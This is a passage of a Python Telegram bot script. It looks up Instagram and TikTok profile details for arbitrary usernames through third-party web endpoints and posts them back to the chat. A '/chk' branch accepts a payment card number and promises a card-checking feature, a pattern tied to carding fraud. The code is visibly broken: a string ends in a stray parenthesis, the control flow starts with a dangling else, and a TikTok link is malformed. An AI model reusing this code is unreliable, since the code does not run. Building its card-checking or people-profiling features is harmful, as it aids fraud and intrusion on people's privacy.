#	elif me.text == '/snap' or me.text == '/snap@CH_IG_FB_TK_SNAP_BOT':
	else:
			mess = str(me.text)
			if (':') in mess:
				user = str(me.text.split(':')[0])
				user2 = str(me.text.split(':')[1])
				req = requests.get(f'https://php-str.herokuapp.com/users.php?user1={user}&user2={user2}').json()
				info = req['results']['instagram']
				username = info['USERNAME']
				id = info['ID']
				name = info['NAME']
				bio = info['BIO']
				post = info['POSTS']
				bio_link = info['BIO_LINK']
				followers = info['FOLLOWERS']
				following = info['FOLLOWING']
				isp = info['PRIVATE']
				ver = info['VERIFIED']
				img = info['IMAGE_PROFILE']
				lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
				iok = lok.json()
				date = str(iok['date'])
				msge =(f'`🦍 INFO ᴵᴺˁᵀᴬᴳᴿᴬᴹ ᴮʸ ᴹᴼᴴᴬᴹᴹᴱᴰ ᴬᴸᴹᵁˁᵂᴵ⌯\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n🚹 ɴᴀᴍᴇ » {name}\n💡 ᴜsᴇʀɴᴀᴍᴇ » {username}\n🚻 ғᴏʟʟᴏᴡᴇʀs » {followers}\n🚸 ғᴏʟʟᴏᴡɪɴɢ » {following}\n📆 ᴅᴀᴛᴇ » {date}\n🗿 ɪᴅ » {id}\n📫 ᴘᴏsᴛs » {post}\n🗳️ ᴘʀɪvᴀᴛᴇ » {isp}\n📥 verified » {ver}\n📈 ʙɪᴏ » {bio}\n📽️ ʙɪᴏ LINK » {bio_link}\n📊 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n`')
				bot.send_photo(me.chat.id,img,caption=msge,parse_mode = "markdown")
				info2 = req['results']['tiktok']
				iddd = info2['ID']
				usr = info2['USERNAME']
				nam2 = info2['NAME']
				bio2 = info2['BIO']
				tik = info2['IMAGE']
				vert = info2['VERIFIED']
				fols = info2['FOLLOWERS']
				fole = info2['FOLLOWING']
				pst = info2['POATS']
				like = info2['HEARTS']
				mtik = (f'`💕 INFO TIKTOK ᴮʸ ᴹᴼᴴᴬᴹᴹᴱᴰ ᴬᴸᴹᵁˁᵂᴵ⌯\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n🚹 ɴᴀᴍᴇ » {nam2}\n💡 ᴜsᴇʀɴᴀᴍᴇ » {usr}\n🚻 ғᴏʟʟᴏᴡᴇʀs » {fols}\n🚸 ғᴏʟʟᴏᴡɪɴɢ » {fole}\n❤️ HEARTS » {like}\n🗿 ɪᴅ » {iddd}\n📫 ᴘᴏsᴛs » {pst}\n📥 verified » {vert}\n📈 ʙɪᴏ » {bio2}\n📊 𝙻𝙸𝙽𝚔 » https://www.tiktok.com.com/@{user2}\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n◔͜͡◔ ʙʏ » @Mohammed_Almuswi @onclik`')
				bot.send_photo(me.chat.id,tik,caption=mtik,parse_mode = "markdown")
			elif '/chk' in mess:
				card = mess.split('/chk ')[1]
				soon = '\n قريبا سيتم وضع قسم لفحص الباطقات اعتذر جذا لفحص هذه البطاقه')
				bot.send_message(me.chat.id,text=soon+card,parse_mode = "markdown")



@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
	json_string = request.get_data().decode("utf-8")
	update = telebot.types.Update.de_json(json_string)
	bot.process_new_updates([update])
	return "!", 200

if __name__ == "__main__":
	bot.remove_webhook()
	bot.set_webhook(url="https://mohammed-almuswi.herokuapp.com/"+str(BOT_TOKEN))
	server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
